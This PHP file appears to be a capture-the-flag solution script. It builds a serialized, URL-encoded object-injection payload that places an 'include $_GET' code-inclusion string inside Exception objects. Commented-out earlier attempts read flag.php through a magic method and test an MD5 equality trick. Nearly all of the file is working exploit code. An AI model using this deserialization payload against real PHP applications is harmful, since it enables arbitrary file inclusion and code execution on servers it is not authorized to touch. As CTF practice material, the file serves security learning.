<?php  

// class Flag{  //flag.php  
//     public $file;  
//     public function __tostring(){  
//         if(isset($this->file)){  
//             echo file_get_contents($this->file); 
//             echo "<br>";
//         return ("U R SO CLOSE !///COME ON PLZ");
//         }  
//     }  
// }  


// class Flag{  
//     public $file;  
//     public function __construct(){  
//         $this->file = "flag.php";  
//     }
// }
// $file=new Flag();
// $flag=serialize($file);
// $flag1=urlencode($flag);
// echo $flag1;

// class SYCLOVER{  
//     public $syc;
//     public $lover;
//     public function __construct(){  
//         $this->syc = array("ls");  
//         $this->lover = array("flag.php");
//     }
// }
// $file=new SYCLOVER();
// $flag=serialize($file);
// $flag1=urlencode($flag);
// echo $flag1;
class SYCLOVER {
    public $syc;
    public $lover;
}

$payload = '?><?= include $_GET[_]; ?>';
$a=new Exception($payload,1);$b=new Exception($payload,2);

$s = new SYCLOVER();
$s->syc = $a;
$s->lover = $b;
var_dump(urlencode(serialize($s)));
// ?>  


<?php  
// $b1="MAUXXQC";
// $b2="MMHUWUV";
// // if($b1!=$b2&&md5($b1)==md5($b2)){
// if($b1!=$b2&&md5($b1)===md5($b2)){
    
//     echo "true\n";
//     echo "flag{".md5($b1)."}\n";
//     echo "flag{".md5($b2)."}";

// }else{
//     echo "false\n";
//     echo "flag{".md5($b1)."}\n";
//     echo "flag{".md5($b2)."}";
// }
?>  